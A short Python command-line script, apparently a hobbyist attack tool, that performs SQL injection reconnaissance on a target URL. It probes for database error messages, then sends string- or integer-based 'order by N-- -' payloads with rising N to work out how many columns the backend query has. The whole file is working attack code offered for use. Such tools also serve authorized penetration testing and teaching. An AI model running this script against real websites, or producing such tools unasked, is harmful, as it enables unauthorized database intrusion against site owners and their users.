#! /usr/bin/env python3

'''
i <3 asuka
'''
import re
import requests as r
from argparse import ArgumentParser
from bs4 import BeautifulSoup as bs

def show_payload():
	banner = "\nList of Available Payload\n\n 1  String Based Injection\t' order by X-- -\n 2  Integer Based Injection\torder by X-- -"
	return banner

def payload(num):
	pl = {1:"'order by ", 2:' order by '}
	return pl[num]

def check(target, payload, col):
	tmp = list()
	c = 1
	error = ['Warning','warning','Error','error','Unknown','unknown','Column','Clause','clause','expects','parameter','resource','boolean','check','manual','order']
	x = set(r.get(target+"'").text.split(" ")).intersection(set(error))
	if len(x) > 0:
		print("Error detected")
		while c <= col :
			url = target+payload+"%i -- -" %c
			phew = r.get(url).text
			print(re.findall(r"Column|Clause|clause'|expects|parameter|resource|boolean|check|manual|'order", phew))
			if len(re.findall(r"Column|Clause|clause'|expects|parameter|resource|boolean|check|manual|'order", phew)) > 0:
				print("Column found : %i" %(c-1))
				break
			else:
				print("Tryin' ordered by %i" %c)
			c += 1
	else:
		print("Error not detected")
		while c <= col :
			url = target+payload+"%i -- -" %c
			x = r.get(url).text
			if len(tmp) < 1:
				tmp.append(x)
			
			if x == tmp[len(tmp)-1]:
				tmp.append(x)
				print("Tryin' ordered by %i" %c)
			else:
				print("Column found : %i" %(c-1))
				break
			c += 1


if __name__ == '__main__':
	parser = ArgumentParser(description="Simple SQL Injection Tools to Check Column's Count and Print Some Basic Info")
	parser.add_argument('-t', '--target', dest="target", help="specify the target url")
	parser.add_argument('-p', '--payload', dest="payload", help="choose the payload", type=int)
	parser.add_argument('-c', '--columns', dest="col", help="set the max columns guest. default=20", type=int, default=20)
	parser.add_argument('--show-payload', dest="show", action="store_true", help="list of available payload")
	args = parser.parse_args()

	if args.show == True:
		print(show_payload())
	else:
		check(args.target, payload(args.payload), args.col)